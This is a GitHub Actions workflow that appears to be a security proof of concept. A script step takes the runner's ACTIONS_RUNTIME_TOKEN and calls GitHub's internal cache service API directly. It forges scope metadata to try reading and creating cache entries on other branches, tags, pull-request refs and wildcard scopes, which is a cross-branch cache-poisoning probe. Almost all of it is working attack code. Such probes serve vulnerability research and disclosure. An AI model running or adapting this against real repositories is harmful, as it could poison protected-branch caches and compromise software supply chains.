name: Cache Scope Branch Manipulation
on:
  workflow_dispatch:
permissions:
  contents: read
  actions: read
jobs:
  scope-branch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v4
        with:
          path: /tmp/scope-data
          key: branch-scope-test-${{ github.run_id }}
      - uses: actions/github-script@v7
        with:
          script: |
            const crypto = require('crypto');
            const env = process.env;
            const resultsUrl = env.ACTIONS_RESULTS_URL;
            const token = env.ACTIONS_RUNTIME_TOKEN;
            const version = crypto.createHash('sha256').update('/tmp/scope-data|zstd').digest('hex');
            
            const twirpBase = `${resultsUrl}twirp/github.actions.results.api.v1.CacheService`;
            const headers = { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' };
            
            // First, create a cache entry on our current scope (refs/heads/main)
            console.log('=== Create cache on own scope ===');
            const key = `scope-manip-${Date.now()}`;
            const cr = await fetch(`${twirpBase}/CreateCacheEntry`, {
              method: 'POST', headers,
              body: JSON.stringify({key, version})
            });
            const crData = await cr.json();
            console.log(`Create: ${cr.status} ok=${crData.ok}`);
            
            if (crData.ok && crData.signed_upload_url) {
              await fetch(crData.signed_upload_url, {
                method: 'PUT',
                headers: {'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob'},
                body: 'SCOPE_TEST_DATA'
              });
              await fetch(`${twirpBase}/FinalizeCacheEntryUpload`, {
                method: 'POST', headers,
                body: JSON.stringify({key, version, sizeBytes: '15'})
              });
            }
            
            // Now try to READ with a different scope
            console.log('\n=== Test: GET with different branch scope ===');
            const scopes = [
              {scope: 'refs/heads/main', permission: 3},
              {scope: 'refs/heads/production', permission: 3},
              {scope: 'refs/heads/develop', permission: 3},
              {scope: 'refs/tags/v1.0', permission: 3},
              {scope: 'refs/pull/1/merge', permission: 3},
              {scope: '*', permission: 3},
              {scope: 'refs/heads/*', permission: 3},
            ];
            
            for (const s of scopes) {
              const r = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
                method: 'POST', headers,
                body: JSON.stringify({
                  key, version,
                  metadata: {scope: [s]}
                })
              });
              const d = await r.json();
              console.log(`Scope "${s.scope}": ok=${d.ok} matched=${d.matched_key || 'none'}`);
            }
            
            // Test: Can I CREATE cache on a different branch scope?
            console.log('\n=== Test: CREATE on different branch scope ===');
            for (const branch of ['refs/heads/production', 'refs/pull/999/merge']) {
              const cr2 = await fetch(`${twirpBase}/CreateCacheEntry`, {
                method: 'POST', headers,
                body: JSON.stringify({
                  key: `cross-branch-${Date.now()}`, version,
                  metadata: {scope: [{scope: branch, permission: 3}]}
                })
              });
              const cr2Data = await cr2.json();
              console.log(`Create on "${branch}": ok=${cr2Data.ok}`);
            }
